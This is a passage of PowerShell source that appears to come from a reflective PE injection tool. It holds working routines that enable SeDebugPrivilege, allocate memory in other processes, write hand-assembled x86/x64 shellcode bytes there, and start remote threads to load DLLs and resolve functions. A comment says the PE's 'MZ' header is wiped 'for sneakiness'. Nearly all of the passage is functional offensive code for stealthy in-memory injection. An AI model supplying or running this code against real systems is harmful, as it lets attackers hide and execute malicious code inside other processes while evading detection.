			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			#Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			#Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		#Get NtHeadersInfo
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		$FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		[IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
        	$FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

		    #Write FunctionName to memory (will be used in GetProcAddress)
		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
		
		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
